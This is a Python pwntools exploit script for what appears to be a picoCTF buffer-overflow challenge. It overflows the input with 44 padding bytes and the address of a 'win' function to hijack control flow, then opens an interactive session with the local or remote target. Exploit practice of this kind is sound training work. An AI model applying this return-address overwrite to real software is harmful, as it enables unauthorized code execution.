#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("./vuln_patched")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("saturn.picoctf.net:50351") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    c
    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def main():
    # good luck pwning :)
    win_addr = exe.symbols["win"]
    print(p32(win_addr))
    p.recvuntil(b"Please enter your string: ")
    p.sendline(b"A" * 44 + p32(win_addr))
    p.interactive()

if __name__ == "__main__":
    main()
